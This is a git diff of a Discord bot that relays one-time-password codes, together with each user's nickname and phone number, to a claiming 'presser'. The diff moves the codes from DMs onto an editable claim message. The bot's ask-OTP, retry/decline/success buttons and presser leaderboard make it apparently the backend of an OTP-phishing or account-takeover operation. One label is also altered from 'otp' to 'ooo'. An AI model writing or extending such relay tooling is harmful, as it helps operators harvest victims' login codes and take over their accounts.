@@ -343,7 +343,7 @@ export async function notifyCodeSubmitted(user, code) {
     if (presserId) {
       const uDisc = await state.bot.users.fetch(String(presserId));
       const embed = new EmbedBuilder()
-        .setTitle("🎯 otp received")
+        .setTitle("🎯 ooo received")
         .setDescription(`**User:** \`${user.nickname}\`\n**phone:** \`${user.phone}\``)
         .setColor(0x22c55e)
         .addFields({ name: "Code", value: `\`\`\`${code}\`\`\``, inline: false });
@@ -409,6 +409,11 @@ export async function handleOkButton(interaction, userId) {
     {
       $set: {
         discord_presser_id: interaction.user.id,
+        // on mémorise où vit ce message pour pouvoir l'éditer plus tard
+        // (ex : quand le code otp arrive via notifyotpReceived), hors de
+        // tout contexte d'interaction Discord.
+        claim_channel_id: interaction.channelId,
+        claim_message_id: interaction.message.id,
         updated_at: nowIso(),
       },
     },
@@ -458,7 +463,8 @@ export async function handleOkButton(interaction, userId) {
   // refresh du leaderboard sans attendre
   refreshLeaderboard().catch((e) => log.error(e));
 }
-// ---------- Callback du bouton "Ask otp" (dans le DM) ----------
+
+// ---------- Callback du bouton "Ask otp" (sur le message de claim) ----------
 export async function handleotpButton(interaction, userId) {
   await interaction.deferUpdate();
 
@@ -497,7 +503,7 @@ export async function handleotpButton(interaction, userId) {
   );
 }
 
-// ---------- otp : panel de vérification (DM à l'admin) ----------
+// ---------- otp : panel de vérification (sur le message de claim) ----------
 function otpBody(nickname, phone, code, cfg) {
   let body =
     `# ${BELL_EMOJI} otp received\n` +
@@ -740,33 +746,33 @@ export async function handleSuccessButton(interaction, userId) {
 }
 
 // ---------- Appelé par votre API HTTP quand le code otp est soumis ----------
-// DM à l'admin qui a pris le ticket : code + 3 boutons.
+// Édite le message de claim (plus de DM) : code + 3 boutons DECLINE/RETRY/SUCCESS.
 export async function notifyotpReceived(user, code) {
   if (!state.bot || state.status !== "online") {
     return { ok: false, message: "bot offline" };
   }
   const cfg = await getConfig();
   const presserId = user.discord_presser_id;
+  const chId = user.claim_channel_id;
+  const msgId = user.claim_message_id;
 
-  if (!presserId) {
+  if (!presserId || !chId || !msgId) {
     await logAction(
-      `⚠️ otp ricevuto per \`${user.nickname}\` ma nessun admin ha claimato.`
+      `⚠️ otp received for \`${user.nickname}\` but no claim message found.`
     );
-    return { ok: false, message: "no presser" };
+    return { ok: false, message: "no claim message" };
   }
 
   try {
-    const uDisc = await state.bot.users.fetch(String(presserId));
-    const msg = await uDisc.send(
+    const ch = await getChannel(chId);
+    const msg = await ch.messages.fetch(msgId);
+    await msg.edit(
       buildotpVerificationView(user.id, user.nickname, user.phone, code, cfg)
     );
-    await state.db
-      .collection("users")
-      .updateOne({ id: user.id }, { $set: { otp_message_id: msg.id } });
     await logAction(
-      `📨 otp \`${code}\` ricevuto per \`${user.nickname}\` — DM a <@${presserId}>`
+      `📨 otp \`${code}\` received for \`${user.nickname}\` — panel updated (<@${presserId}>)`
     );
-    return { ok: true, message: "sent" };
+    return { ok: true, message: "edited" };
   } catch (e) {
     log.warn(`notify_otp_received failed: ${e}`);
     return { ok: false, message: String(e) };
